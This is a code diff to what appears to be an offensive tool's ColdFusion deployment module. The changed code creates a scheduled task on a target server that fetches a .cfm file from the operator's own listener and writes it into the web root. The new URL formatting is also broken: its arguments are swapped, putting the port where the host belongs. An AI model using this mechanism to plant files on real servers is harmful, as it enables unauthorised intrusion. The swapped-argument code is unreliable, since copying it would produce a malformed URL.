@@ -1,6 +1,6 @@
 from src.platform.coldfusion.interfaces import CINTERFACES
 from src.platform.coldfusion.authenticate import checkAuth
-from src.module.deploy_utils import _serve, waitServe, parse_war_path
+from src.module.deploy_utils import _serve, waitServe, parse_war_path,killServe
 from os.path import abspath
 from log import LOG
 from threading import Thread
@@ -76,7 +76,8 @@ def create_task(ip, fingerprint, cfm_file, root):
             "ScheduleType" : "Once",
             "StartTimeOnce" : "9:56 PM", # see above
             "Operation" : "HTTPRequest",
-            "ScheduledURL" : "http://{0}:8000/{1}".format(utility.local_address(), cfm_file),
+            "ScheduledURL" : "http://{0}:{1}/{2}".format(
+                    state.external_port,utility.local_address(), cfm_file),
             "publish" : "1",
             "publish_file" : root + "\\" + cfm_file, # slash on OS?
             "adminsubmit" : "Submit"
@@ -153,10 +154,7 @@ def run_task(ip, fingerprint, cfm_path):
     if waitServe(server_thread):
         utility.Msg("{0} deployed to /CFIDE/{0}".format(cfm_name), LOG.SUCCESS)
 
-    try:
-        utility.requests_get("http://localhost:8000", timeout=1)
-    except:
-        pass
+    killServe()
 
 
 def fetch_csrf(ip, fingerprint, url):
